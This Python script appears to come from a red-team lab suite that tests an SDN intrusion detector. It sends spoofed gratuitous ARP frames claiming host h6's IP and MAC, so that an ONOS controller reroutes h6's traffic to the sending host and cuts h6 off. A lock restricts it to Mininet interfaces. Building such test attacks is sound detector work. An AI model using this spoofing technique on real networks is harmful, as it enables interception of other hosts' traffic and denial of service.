#!/usr/bin/env python3
"""
Sentinel red-team: identity spoofing / host-location hijack (S7).

Low-volume attack. Sends gratuitous ARP frames whose SOURCE MAC is h6's MAC and
whose advertised IP is h6's IP, so ONOS's host-location provider moves h6 from
its real port to the sending host's port. Traffic for h6 is then delivered to
the attacker, and the real h6 is cut off.

The sending host is auto-detected, so this can be launched from ANY host, not
just h1 -- useful for testing whether the detector's identity path generalises
across ports.

FLAGS
  --duration N  total seconds the attack runs (default 60)
  --rate N      spoofed ARPs per second (default 2, low on purpose)
  --iface NAME  sending interface (default: auto-detect the host's *-eth0)

Run inside a host's namespace (run_scenario.py does this for you):
  sudo mnexec -a <host-pid> python3 scenarios/attacks/spoof.py --duration 60
"""

import argparse
import os
import re
import sys
import time

from scapy.all import Ether, ARP, sendp

# The stolen identity is fixed to h6; only the SOURCE host varies.
VICTIM_IP = "10.0.3.2"
VICTIM_MAC = "00:00:00:00:00:06"


def detect_iface():
    """The host's data interface inside its Mininet namespace (h1-eth0,
    h3-eth0, ...). Auto-detected so the spoof runs from any host."""
    for name in sorted(os.listdir("/sys/class/net")):
        if name.endswith("-eth0"):
            return name
    sys.exit("no <host>-eth0 interface found; run inside a Mininet host "
             "(mnexec -a <host-pid> ...).")


def gratuitous_arp():
    """A gratuitous ARP 'reply' announcing h6's IP at h6's MAC, sent from this
    host's port. op=2 is an unsolicited reply, accepted as a location update."""
    return (Ether(src=VICTIM_MAC, dst="ff:ff:ff:ff:ff:ff") /
            ARP(op=2, psrc=VICTIM_IP, hwsrc=VICTIM_MAC,
                pdst=VICTIM_IP, hwdst="ff:ff:ff:ff:ff:ff"))


def main():
    p = argparse.ArgumentParser(description="Lab identity spoofing (S7)")
    p.add_argument("--duration", type=int, default=60,
                   help="total seconds the attack runs (default 60)")
    p.add_argument("--rate", type=float, default=2.0,
                   help="spoofed ARPs per second (default 2, low on purpose)")
    p.add_argument("--iface", default=None,
                   help="sending interface (default: auto-detect <host>-eth0)")
    args = p.parse_args()

    iface = args.iface or detect_iface()
    # Lab lock: only ever send from a Mininet host interface (h1-eth0, h3-eth0,
    # ...), never the VM's real NIC. Blocks e.g. --iface eth0 in the root namespace.
    if not re.fullmatch(r"h\d+-eth0", iface):
        sys.exit("refusing %s: only Mininet host interfaces (h1-eth0, h3-eth0, ...)"
                 % iface)
    if not os.path.exists("/sys/class/net/%s" % iface):
        sys.exit("%s not found. Run this inside a Mininet host "
                 "(mnexec -a <host-pid> ...)." % iface)

    frame = gratuitous_arp()
    gap = 1.0 / args.rate
    end = time.time() + args.duration
    sent = 0
    print("spoof: iface=%s claiming h6 (%s / %s), %.1f ARP/s for %ds" %
          (iface, VICTIM_IP, VICTIM_MAC, args.rate, args.duration), flush=True)

    try:
        while time.time() < end:
            sendp(frame, iface=iface, verbose=False)
            sent += 1
            time.sleep(gap)
    except KeyboardInterrupt:
        pass
    print("spoof: stopped after %d spoofed ARPs" % sent, flush=True)


if __name__ == "__main__":
    main()
